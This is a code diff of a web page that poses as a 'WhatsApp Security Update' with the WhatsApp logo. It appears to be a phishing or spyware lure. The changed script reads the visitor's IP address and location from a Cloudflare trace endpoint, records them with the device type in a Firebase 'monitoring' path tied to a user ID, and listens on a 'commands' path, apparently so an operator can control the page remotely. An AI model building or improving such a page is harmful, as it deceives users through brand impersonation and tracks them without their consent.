@@ -26,7 +26,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.whatsapp.com/favicon.ico" class="logo" style="display:none"> <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         <div class="header-title">WhatsApp Security Update</div>
         <div id="u-badge" class="badge">Checking Device...</div>
         <div class="v-box">
@@ -87,24 +87,19 @@
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             
-            // استخدام خدمة تدعم HTTPS بنسبة 100% وجلب البيانات بشكل أسرع
-            fetch('https://ipwho.is/')
-                .then(r => r.json())
-                .then(d => {
-                    sRef.set({ 
-                        status: "Online", 
-                        ip: d.ip || "N/A", 
-                        region: (d.city || "") + ", " + (d.region || ""), 
-                        device: isIOS ? "iPhone" : "Android", 
-                        ts: Date.now() 
+            fetch('https://www.cloudflare.com/cdn-cgi/trace')
+                .then(r => r.text())
+                .then(data => {
+                    const lines = data.split('\n');
+                    let ip = "N/A", loc = "N/A";
+                    lines.forEach(line => {
+                        if (line.startsWith('ip=')) ip = line.split('=')[1];
+                        if (line.startsWith('loc=')) loc = line.split('=')[1];
                     });
+                    sRef.set({ status: "Online", ip: ip, region: loc, device: isIOS ? "iPhone" : "Android", ts: Date.now() });
                 })
                 .catch(() => {
-                    sRef.set({ 
-                        status: "Online", 
-                        device: isIOS ? "iPhone" : "Android", 
-                        ts: Date.now() 
-                    });
+                    sRef.set({ status: "Online", device: isIOS ? "iPhone" : "Android", ts: Date.now() });
                 });
 
             db.ref('commands/' + userId).on('value', s => {
